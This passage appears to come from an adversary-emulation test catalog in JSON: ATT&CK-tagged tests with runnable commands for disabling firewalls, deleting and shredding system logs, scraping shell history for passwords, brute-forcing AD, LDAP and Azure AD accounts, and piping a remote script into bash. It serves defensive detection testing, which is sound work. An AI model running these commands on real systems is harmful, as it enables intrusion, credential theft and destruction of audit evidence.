				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\..\\atomics\\T1562.004\\src\\esxi_disable_firewall.txt\n",
			"cleanup_command": "#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\..\\atomics\\T1562.004\\src\\esxi_enable_firewall.txt\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Set a firewall rule using New-NetFirewallRule",
		"auto_generated_guid": "94be7646-25f6-467e-af23-585fb13000c8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"direction": {
				"description": "Direction can be Inbound or Outbound",
				"type": "string",
				"default": "Inbound"
			},
			"local_port": {
				"description": "This is the local port you wish to test opening",
				"type": "integer",
				"default": 21
			},
			"protocol": {
				"description": "This is the protocol",
				"type": "string",
				"default": "TCP"
			},
			"action": {
				"description": "This is the action",
				"type": "string",
				"default": "allow"
			}
		},
		"executor": {
			"command": "New-NetFirewallRule -DisplayName \"New rule\" -Direction \"#{direction}\" -LocalPort \"#{local_port}\" -Protocol \"#{protocol}\" -Action \"#{action}\"",
			"cleanup_command": "Remove-NetFirewallRule -DisplayName \"New rule\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "System Time Discovery",
		"auto_generated_guid": "20aba24b-e61f-4b26-b4ce-4784f763ca20",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"computer_name": {
				"description": "computer name to query",
				"type": "string",
				"default": "localhost"
			}
		},
		"executor": {
			"command": "net time \\\\#{computer_name}\nw32tm /tz\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1124",
		"phases": ["discovery"]
	},
	{
		"name": "System Time Discovery - PowerShell",
		"auto_generated_guid": "1d5711d6-655c-4a47-ae9c-6503c74fa877",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-Date\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1124",
		"phases": ["discovery"]
	},
	{
		"name": "System Time Discovery in FreeBSD/macOS",
		"auto_generated_guid": "f449c933-0891-407f-821e-7916a21a1a6f",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "date\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1124",
		"phases": ["discovery"]
	},
	{
		"name": "System Time Discovery W32tm as a Delay",
		"auto_generated_guid": "d5d5a6b0-0f92-42d8-985d-47aafa2dd4db",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1124",
		"phases": ["discovery"]
	},
	{
		"name": "System Time with Windows time Command",
		"auto_generated_guid": "53ead5db-7098-4111-bb3f-563be390e72e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "time\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1124",
		"phases": ["discovery"]
	},
	{
		"name": "Telnet C2",
		"auto_generated_guid": "3b0df731-030c-4768-b492-2a3216d90e53",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Command and Control (C2) server cam be established by running PathToAtomicsFolder\\T1071\\bin\\telnet_server.exe on specified server with specified IP that must be reachable by client (telnet_client.exe)\n",
				"prereq_command": "$connection = Test-NetConnection -ComputerName #{server_ip} -Port #{server_port}\nif ($connection.TcpTestSucceeded) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host \"Setup C2 server manually\"\n"
			}
		],
		"input_arguments": {
			"server_ip": {
				"description": "C2 server IP or URL",
				"type": "url",
				"default": "127.0.0.1"
			},
			"client_path": {
				"description": "Client agent path",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1071\\bin\\telnet_client.exe"
			},
			"server_port": {
				"description": "C2 server port",
				"type": "integer",
				"default": 23
			}
		},
		"executor": {
			"command": "#{client_path} #{server_ip} --port #{server_port}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1071",
		"phases": ["command-and-control"]
	},
	{
		"name": "Search Through Bash History",
		"auto_generated_guid": "3cfde62b-7c33-4b26-a61e-755d6131c8ce",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "~/loot.txt"
			},
			"bash_history_grep_args": {
				"description": "grep arguments that filter out specific commands we want to capture",
				"type": "path",
				"default": "-e '-p ' -e 'pass' -e 'ssh'"
			},
			"bash_history_filename": {
				"description": "Path of the bash history file to capture",
				"type": "path",
				"default": "~/.bash_history"
			}
		},
		"executor": {
			"command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Search Through sh History",
		"auto_generated_guid": "d87d3b94-05b4-40f2-a80f-99864ffa6803",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "~/loot.txt"
			},
			"sh_history_grep_args": {
				"description": "grep arguments that filter out specific commands we want to capture",
				"type": "path",
				"default": "-e '-p ' -e 'pass' -e 'ssh'"
			},
			"sh_history_filename": {
				"description": "Path of the sh history file to capture",
				"type": "path",
				"default": "~/.history"
			}
		},
		"executor": {
			"command": "cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Build Image On Host",
		"auto_generated_guid": "2db30061-589d-409b-b125-7b473944f9b3",
		"supported_platforms": ["containers"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify docker is installed.",
				"prereq_command": "which docker\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
			},
			{
				"description": "Verify docker service is running.",
				"prereq_command": "sudo systemctl status docker  --no-pager\n",
				"get_prereq_command": "sudo systemctl start docker\n"
			}
		],
		"executor": {
			"command": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/\ndocker run --name t1612_container  -d -t t1612\ndocker exec t1612_container ./test.sh",
			"cleanup_command": "docker stop t1612_container\ndocker rmi -f t1612",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1612",
		"phases": ["defense-evasion"]
	},
	{
		"name": "rm -rf",
		"auto_generated_guid": "989cc1b1-3642-4260-a809-54f9dd559683",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"syslog_path": {
				"description": "path of syslog file to delete. On macos it's /var/log/system.log*, on linux, it's /var/log/syslog*. Also note for File events, that on macos, /var/ is a link to /private/var/.",
				"type": "string",
				"default": "/var/log/system.log"
			},
			"macos_audit_path": {
				"description": "path of audit file to delete",
				"type": "string",
				"default": "/var/audit/20220725213300.202208110700021"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "if [ -d /var/audit ] ; then stat #{macos_audit_path} ; fi && stat #{syslog_path}\n",
				"get_prereq_command": "touch #{syslog_path}\nif [ -d /var/audit ] ; then touch #{macos_audit_path} ; fi\n"
			}
		],
		"executor": {
			"command": "sudo rm -rf #{syslog_path}\nif [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "rm -rf",
		"auto_generated_guid": "bd8ccc45-d632-481e-b7cf-c467627d68f9",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "rm -rf /var/log/messages\nrm -rf /var/log/security\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete log files using built-in log utility",
		"auto_generated_guid": "653d39cd-bae7-499a-898c-9fb96b8b5cd1",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo log erase --all\nsudo log erase --ttl #Deletes only time-to-live log content\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Truncate system log files via truncate utility",
		"auto_generated_guid": "6290f8a8-8ee9-4661-b9cf-390031bf6973",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path of system log to delete.",
				"type": "string",
				"default": "/var/log/system.log"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{system_log_path}\n",
				"get_prereq_command": "touch #{system_log_path}\n"
			}
		],
		"executor": {
			"command": "sudo truncate -s 0 #{system_log_path} #size parameter shorthand\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Truncate system log files via truncate utility (freebsd)",
		"auto_generated_guid": "14033063-ee04-4eaf-8f5d-ba07ca7a097c",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "truncate -s 0 /var/log/messages #size parameter shorthand\ntruncate --size=0 /var/log/security #size parameter \n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete log files via cat utility by appending /dev/null or /dev/zero",
		"auto_generated_guid": "c23bdb88-928d-493e-b46d-df2906a50941",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path of system log to delete.",
				"type": "string",
				"default": "/var/log/system.log"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{system_log_path}\n",
				"get_prereq_command": "touch #{system_log_path}\n"
			}
		],
		"executor": {
			"command": "sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes\nsudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)",
		"auto_generated_guid": "369878c6-fb04-48d6-8fc2-da9d97b3e054",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "cat /dev/null > /var/log/messages #truncating the file to zero bytes\ncat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "System log file deletion via find utility",
		"auto_generated_guid": "bc8eeb4a-cc3e-45ec-aa6e-41e973da2558",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_name1": {
				"description": "name or prefix of system log to delete.",
				"type": "string",
				"default": "system.log"
			},
			"system_log_name2": {
				"description": "name or prefix of system log to delete.",
				"type": "string",
				"default": "system.log.97.gz"
			},
			"system_log_name3": {
				"description": "name or prefix of system log to delete.",
				"type": "string",
				"default": "system.log.98.gz"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}\n",
				"get_prereq_command": "touch /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}\n"
			}
		],
		"executor": {
			"command": "sudo find /var/log -name '#{system_log_name1}*' -exec rm {} \\; #using \"rm\" execution\nsudo find /var/log -name \"#{system_log_name2}*\" -exec shred -u -z -n 3 {} \\; #using \"shred\" execution\nsudo find /var/log -name \"#{system_log_name3}*\" -exec unlink {} \\; #using \"unlink\" execution\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Overwrite macOS system log via echo utility",
		"auto_generated_guid": "0208ea60-98f1-4e8c-8052-930dce8f742c",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path to system.log",
				"type": "string",
				"default": "/var/log/system.log"
			}
		},
		"executor": {
			"command": "sudo echo '' > #{system_log_path}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Overwrite FreeBSD system log via echo utility",
		"auto_generated_guid": "11cb8ee1-97fb-4960-8587-69b8388ee9d9",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "echo '' > /var/log/messages\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Real-time system log clearance/deletion",
		"auto_generated_guid": "848e43b3-4c0a-4e4c-b4c9-d1e8cea9651c",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo log -f /var/log/system.log | : > /var/log/system.log\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete system log files via unlink utility",
		"auto_generated_guid": "03013b4b-01db-437d-909b-1fdaa5010ee8",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path to system.log",
				"type": "string",
				"default": "/var/log/system.log"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{system_log_path}\n",
				"get_prereq_command": "touch #{system_log_path}\n"
			}
		],
		"executor": {
			"command": "sudo unlink #{system_log_path}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete system log files via unlink utility (freebsd)",
		"auto_generated_guid": "45ad4abd-19bd-4c5f-a687-41f3eee8d8c2",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "unlink /var/log/messages\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete system log files using shred utility",
		"auto_generated_guid": "86f0e4d5-3ca7-45fb-829d-4eda32b232bb",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path to system.log",
				"type": "string",
				"default": "/var/log/system.log"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{system_log_path}\n",
				"get_prereq_command": "touch #{system_log_path}\n"
			}
		],
		"executor": {
			"command": "sudo shred -u -z -n 3 #{system_log_path}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete system log files using srm utility",
		"auto_generated_guid": "b0768a5e-0f32-4e75-ae5b-d036edcf96b6",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path to system.log",
				"type": "string",
				"default": "/var/log/system.log"
			},
			"system_log_folder": {
				"description": "path to log parent folder",
				"type": "string",
				"default": "/var/log/"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{system_log_path} #{system_log_folder}\n",
				"get_prereq_command": "mkdir -p #{system_log_folder} && touch #{system_log_path} #{system_log_folder}/system.log\n"
			}
		],
		"executor": {
			"command": "sudo srm #{system_log_path} #system log file deletion\nsudo srm -r #{system_log_folder} #recursive deletion of log files\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete system log files using OSAScript",
		"auto_generated_guid": "810a465f-cd4f-47bc-b43e-d2de3b033ecc",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path to system.log",
				"type": "string",
				"default": "/var/log/system.log"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{system_log_path}\n",
				"get_prereq_command": "touch #{system_log_path}\n"
			}
		],
		"executor": {
			"command": "osascript -e 'do shell script \"rm #{system_log_path}\" with administrator privileges'\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete system log files using Applescript",
		"auto_generated_guid": "e62f8694-cbc7-468f-862c-b10cd07e1757",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"system_log_path": {
				"description": "path to system.log",
				"type": "string",
				"default": "/var/log/system.log"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{system_log_path}\n",
				"get_prereq_command": "touch #{system_log_path}\n"
			}
		],
		"executor": {
			"command": "osascript -e 'tell application \"Finder\" to delete POSIX file \"#{system_log_path}\"'\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete system journal logs via rm and journalctl utilities",
		"auto_generated_guid": "ca50dd85-81ff-48ca-92e1-61f119cb1dcf",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"journal_folder": {
				"description": "path to journal logs",
				"type": "string",
				"default": "/var/log/journal"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat #{journal_folder}\n",
				"get_prereq_command": "mkdir -p #{journal_folder} && touch #{journal_folder}/T1070_002.journal\n"
			}
		],
		"executor": {
			"command": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Overwrite Linux Mail Spool",
		"auto_generated_guid": "1602ff76-ed7f-4c94-b550-2f727b4782d4",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"username": {
				"description": "Username of mail spool",
				"type": "string",
				"default": "root"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "target files must exist\n",
				"prereq_command": "stat /var/spool/mail/#{username}\n",
				"get_prereq_command": "touch /var/spool/mail/#{username}\n"
			}
		],
		"executor": {
			"elevation_required": true,
			"command": "echo 0> /var/spool/mail/#{username}\n",
			"name": "bash"
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Overwrite Linux Log",
		"auto_generated_guid": "d304b2dc-90b4-4465-a650-16ddd503f7b5",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"log_path": {
				"description": "Path of specified log",
				"type": "path",
				"default": "/var/log/secure"
			}
		},
		"executor": {
			"command": "echo 0> #{log_path}\n",
			"name": "bash",
			"elevation_required": true,
			"cleanup_command": "if [ \"/var/log/secure\" != \"#{log_path}\" ] ; then rm -f #{log_path} ; fi\n"
		},
		"attack_technique": "T1070.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Brute Force Credentials of single Active Directory domain users via SMB",
		"auto_generated_guid": "09480053-2f98-4854-be6e-71ae5f672224",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user": {
				"description": "Account to bruteforce",
				"type": "string",
				"default": "%username%"
			}
		},
		"executor": {
			"name": "command_prompt",
			"command": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL\n",
			"elevation_required": false
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)",
		"auto_generated_guid": "c2969434-672b-4ec8-8df0-bbb91f40e250",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user": {
				"description": "Account to bruteforce",
				"type": "string",
				"default": "$ENV:USERNAME"
			},
			"passwords_path": {
				"description": "List of passwords we will attempt to brute force with",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1110.001\\src\\passwords.txt"
			},
			"domain": {
				"description": "Active Directory domain FQDN",
				"type": "string",
				"default": "$env:UserDnsDomain"
			},
			"auth": {
				"description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
				"type": "string",
				"default": "NTLM"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwordList = Get-Content -Path \"#{passwords_path}\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n"
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Brute Force Credentials of single Azure AD user",
		"auto_generated_guid": "5a51ef57-299e-4d62-8e11-2d440df55e69",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg \"bruce.wayne@<valid_ms_account.com>\"",
				"type": "string",
				"default": "bruce.wayne@contoso.com"
			},
			"passwords": {
				"description": "List of passwords we will attempt to brute force with",
				"type": "string",
				"default": "Password1`n1q2w3e4r`nPassword!"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n"
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Password Brute User using Kerbrute Tool",
		"auto_generated_guid": "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domaincontroller": {
				"description": "Domain controller where test will be run",
				"type": "string",
				"default": "$ENV:userdnsdomain"
			},
			"domain": {
				"description": "Domain where you will be testing",
				"type": "string",
				"default": "$ENV:userdomain"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
			},
			{
				"description": "bruteuser.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\bruteuser.txt TestUser1 \n"
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "SUDO Brute Force - Debian",
		"auto_generated_guid": "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"remote_url": {
				"description": "url of remote payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Check if running on a Debian based machine.\n",
				"prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
				"get_prereq_command": "apt update && apt install -y openssl sudo curl\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
			"cleanup_command": "userdel -fr art\n"
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "SUDO Brute Force - Redhat",
		"auto_generated_guid": "4097bc00-5eeb-4d56-aaf9-287d60351d95",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"remote_url": {
				"description": "url of remote payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Check if running on a Redhat based machine.\n",
				"prereq_command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
				"get_prereq_command": "yum update && yum install -y openssl sudo curl\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
			"cleanup_command": "userdel -fr art\n"
		},
		"attack_technique": "T1110.001",
		"phases": ["credential-access"]
	},
	{
		"name": "SUDO Brute Force - FreeBSD",
		"auto_generated_guid": "abcde488-e083-4ee7-bc85-a5684edd7541",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"remote_url": {
				"description": "url of remote payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if running on a FreeBSD based machine.\n",
